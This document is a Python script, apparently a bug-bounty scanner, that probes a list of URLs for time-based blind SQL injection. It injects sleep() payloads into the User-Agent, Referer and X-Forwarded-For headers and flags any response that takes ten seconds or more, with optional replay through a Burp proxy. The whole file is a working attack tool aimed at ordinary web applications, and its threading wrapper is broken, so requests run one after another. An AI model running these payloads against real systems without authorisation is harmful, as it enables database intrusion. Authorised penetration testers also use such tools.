import requests
import argparse
import urllib3
import urllib
import threading

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


banner = f"""{bcolors.OKCYAN}
                                               ___   ___ 
		//    / / //    ) ) / /          / /    
	       //___ / / //    / / / /          / /     
	      / ___   / //    / / / /          / /      
	     //    / / //  \ \ / / /          / /       
	    //    / / ((____\ \ / /____/ / __/ /___     
                HEADER SQLI Injection Tester
😍 {bcolors.WARNING}Made with <3 By ITPAT{bcolors.OKCYAN}
-------------------------------------------------------------------------------{bcolors.ENDC}
 {bcolors.WARNING}Credit  ❯ https://twitter.com/root_tanishq{bcolors.ENDC}
 {bcolors.WARNING}Twitter ❯ https://twitter.com/IttipatJitrada{bcolors.OKCYAN}
-------------------------------------------------------------------------------
{bcolors.ENDC}"""
print(banner)

parser = argparse.ArgumentParser()
parser.add_argument('-l', '--list', type=argparse.FileType('r'),
                    help='List of URL to check for User-Agent and Referer and X-Forwarded-For SQL Injection \n \t -l urllist.txt', required=True)
parser.add_argument('-p', '--proxy', type=str,
                    help='Burp proxy or any other proxy \n \t -p http://127.0.0.1:8080', default="no-proxy")
args = parser.parse_args()


def sqli_request(url):
    try:
        req = requests.Session()
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(2*5),0))OR'",
                   "Referer": "'+(select*from(select(if(1=1,sleep(10),false)))a)+'", "X-Forwarded-For": "0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z"}
        burp_Proxy = {"http": args.proxy, "https": args.proxy}
        res = req.get(url, headers=headers, verify=False)
        sleepRequest = int(res.elapsed.total_seconds()) 
        if sleepRequest >= 10:
            if args.proxy != "no-proxy":
                try:
                    burp_Request = req.get(
                        url, headers=headers, proxies=burp_Proxy, verify=False, timeout=0.0000000001)
                except:
                    pass
            print(
                f"{bcolors.OKGREEN}URL : [", url, "] \t \t \t Time Take : [",sleepRequest, f"]{bcolors.ENDC}")
        else:
            print(
                f"{bcolors.FAIL}URL : [", url, "] \t \t \t Time Take : [",sleepRequest, f"]{bcolors.ENDC}")
    except KeyboardInterrupt:
        exit(0)
    except:
        print(f"{bcolors.FAIL}Error in : [", url, f"]{bcolors.ENDC}")


def fuzz_Request(url):
    thread = threading.Thread(target=sqli_request(url))
    thread.start()


readFile = args.list.read()
listSplit = readFile.split('\n')


def main():
    for url in listSplit:
        fuzz_Request(url)


main()
